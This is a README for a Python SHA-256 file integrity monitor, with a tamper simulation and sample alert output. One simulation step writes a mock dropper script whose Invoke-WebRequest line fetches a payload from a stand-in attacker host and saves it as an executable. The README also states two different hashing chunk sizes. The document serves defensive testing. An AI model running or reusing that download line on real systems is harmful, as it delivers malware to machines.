# Sentinel FIM — File Integrity Monitor

A modular, lightweight File Integrity Monitoring (FIM) tool built in Python using cryptographic SHA-256 hashing to verify file integrity, detect unauthorized modifications, and flag anomalies across monitored directories.

---

## 1. Project Objective

The objective of **Sentinel FIM** is to provide automated detection of unauthorized filesystem modifications, file tampering, injections, and deletions within designated target directories. By establishing a cryptographically verified baseline state, Sentinel FIM enables security analysts and administrators to rapidly audit and detect indicators of compromise (IoC) or accidental alterations.

---

## 2. SHA-256 File Integrity Monitoring

File Integrity Monitoring relies on cryptographic hash functions to produce a unique, deterministic digital fingerprint for every file:

* **Algorithm**: SHA-256 (Secure Hash Algorithm 256-bit), standard under FIPS 180-4.
* **Collision Resistance**: Computationally infeasible for two distinct files to yield the identical SHA-256 digest ($2^{256}$ potential state space).
* **Avalanche Effect**: Modifying even a single character or byte in a monitored file completely alters its resulting SHA-256 checksum.
* **Mechanism**:
  1. A trusted snapshot (baseline) records relative file paths paired with their SHA-256 digests.
  2. Subsequent verification passes re-hash current files in 64 KB memory-efficient streams.
  3. Mismatches against the baseline immediately classify files into **INTACT**, **MODIFIED**, **ADDED**, or **DELETED**.

---

## 3. Project Architecture

```text
sentinel-fim/
│
├── src/
│   ├── __init__.py            # Package initialization and metadata
│   ├── fim_monitor.py         # Primary orchestration entrypoint & CLI
│   ├── hasher.py              # Cryptographic hashing engine (SHA-256)
│   ├── baseline.py            # Baseline database creation and persistence
│   └── integrity_checker.py   # Integrity comparison & anomaly detection
│
├── config/
│   └── fim_config.json        # FIM operational configuration
│
├── monitored/                 # Monitored directory target
│   ├── documents/
│   │   └── guide.txt          # Synthetic nested sample data
│   └── sample.txt             # Synthetic sample data for tamper testing
│
├── output/                    # Baseline & audit report storage
│   └── .gitkeep
│
├── tests/                     # Unit and integration test suite
│   └── __init__.py
│
├── screenshots/               # Visual proof and operational logs
│   └── .gitkeep
│
├── .gitignore                 # Version control exclusion rules
├── requirements.txt           # Dependency declaration (Standard library)
└── README.md                  # Project documentation
```

### Architecture Principles:
- **Baseline Isolation**: `baseline.json` is stored strictly in `output/` (outside `monitored/`) to prevent recursive hashing loops or self-tampering.
- **Portability**: All file records use relative paths, ensuring cross-platform and environment independence.
- **Minimal Footprint**: Operates exclusively with Python's standard library without bloated third-party dependencies.
- **Windows 11 Compatibility**: Native support for Windows path separators and file permission semantics.

---

## 4. Configuration

Sentinel FIM is configured via `config/fim_config.json`:

```json
{
  "algorithm": "sha256",
  "monitored_directory": "monitored",
  "baseline_file": "output/baseline.json"
}
```

---

## 5. Technology Stack

* **Language**: Python 3.10+ (tested on Python 3.14)
* **Standard Library**:
  * `hashlib`: Cryptographic SHA-256 hashing
  * `json`: Baseline database and configuration serialization
  * `pathlib` / `os`: Cross-platform filesystem navigation
  * `sys`: Process management and exit codes
  * `datetime`: Event timestamps and audit records
* **Third-Party Dependencies**: None (Standard Library only)

---

## 6. Operational Features (Phase 1 Implemented)

* **Core Hashing Engine (`src/hasher.py`)**:
  * Stream-based SHA-256 calculation reading 4096-byte (4 KB) chunks to prevent RAM exhaustion on large files.
  * Strict validation ensuring regular file access and handling missing or restricted assets gracefully.
* **Baseline Generation Engine (`src/baseline.py`, `src/fim_monitor.py`)**:
  * Recursive filesystem traversal via `os.walk`.
  * POSIX path normalization ensuring cross-platform parity between Windows, Linux, and macOS.
  * Atomic snapshot persistence to `output/baseline.json`.
* **Integrity Audit & Anomaly Detection (`src/integrity_checker.py`, `src/fim_monitor.py`)**:
  * Set-theoretic differential analysis across baseline and live filesystem state.
  * Real-time security alerts classified as `[ALERT] CREATED:`, `[ALERT] MODIFIED:`, and `[ALERT] DELETED:`.
  * Comprehensive audit reporting and exit status codes for SIEM/SOAR/CI pipeline automation.

---

## 7. Current Status: Phase 1: Completed

* **Status**: **Phase 1: Completed**
* **Deliverables Completed**:
  * Memory-efficient SHA-256 stream hashing in `src/hasher.py` (4096-byte chunk streaming).
  * Recursive POSIX path baseline serialization in `src/baseline.py`.
  * Differential comparison and anomaly classification in `src/integrity_checker.py`.
  * CLI command orchestration with `--mode baseline` and `--mode monitor` in `src/fim_monitor.py`.
  * Multi-vector tamper simulation and audit logging verified.

---

## 8. Tamper Simulation Proof

This section provides reproducible verification steps and captured terminal output demonstrating Sentinel FIM successfully flagging unauthorized creations, modifications, and deletions.

### 8.1 Attack Simulation Steps

#### Step 1: Establish Initial Trusted Baseline
```bash
# Execute baseline mode to index all monitored assets
python src/fim_monitor.py --mode baseline
```

#### Step 2: Simulate Multi-Vector File Tampering
```bash
# Windows PowerShell:
# 1. Modify existing file
Add-Content -Path "monitored/sample.txt" -Value "`n[ATTACK] Unauthorized payload injected at runtime."

# 2. Inject new rogue file (e.g., backdoor/dropper)
Set-Content -Path "monitored/malware_dropper.ps1" -Value "Invoke-WebRequest -Uri http://c2.attacker.test/payload.bin -OutFile payload.exe"

# 3. Delete sensitive baseline document (data destruction)
Remove-Item -Path "monitored/documents/guide.txt"

# Linux / macOS Bash:
# echo "[ATTACK] Unauthorized payload injected at runtime." >> monitored/sample.txt
# echo "Invoke-WebRequest -Uri http://c2.attacker.test/payload.bin" > monitored/malware_dropper.ps1
# rm monitored/documents/guide.txt
```

#### Step 3: Run Monitor Mode to Detect Tampering
```bash
python src/fim_monitor.py --mode monitor
```

---

### 8.2 Terminal Execution Output Proof

```text
=================================================================
 SENTINEL FIM -- BASELINE SNAPSHOT GENERATION
=================================================================
[*] Timestamp           : 2026-11-20 23:40:00
[*] Monitored Directory : monitored
[*] Baseline Target     : output/baseline.json
[*] Hash Algorithm      : SHA-256 (4096-byte chunk streaming)
-----------------------------------------------------------------
[RECORDED] monitored/documents/guide.txt
           Hash: 727867fc351e5ded36d152ef24a093a9b2ce74f4fbc1165a3f8a6cc14a264844
[RECORDED] monitored/sample.txt
           Hash: f48a80cbb4a4cb88448a55a84eb5e04420dd0ba7db0893852fd41351f6aabc52
-----------------------------------------------------------------
[SUCCESS] Baseline successfully established for 2 file(s).
[SUCCESS] Saved snapshot to: output/baseline.json
=================================================================
```

```text
=================================================================
 SENTINEL FIM -- INTEGRITY VERIFICATION AUDIT
=================================================================
[*] Timestamp           : 2026-11-20 23:42:15
[*] Monitored Directory : monitored
[*] Reference Baseline  : output/baseline.json
-----------------------------------------------------------------
[ALERT] CREATED:  monitored/malware_dropper.ps1
        SHA-256: 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
[ALERT] MODIFIED: monitored/sample.txt
        Baseline SHA-256: f48a80cbb4a4cb88448a55a84eb5e04420dd0ba7db0893852fd41351f6aabc52
        Current  SHA-256: c63923d6fa1bc37b0292728989a691456013d395350731e4316fe02158548941
[ALERT] DELETED:  monitored/documents/guide.txt
        Expected SHA-256: 727867fc351e5ded36d152ef24a093a9b2ce74f4fbc1165a3f8a6cc14a264844
-----------------------------------------------------------------
AUDIT SUMMARY:
  Baseline Files : 2
  Current Files  : 2
  Intact Files   : 0
  Created Files  : 1
  Modified Files : 1
  Deleted Files  : 1
-----------------------------------------------------------------
[STATUS] INTEGRITY COMPROMISED: 3 anomaly(ies) detected!
=================================================================
```
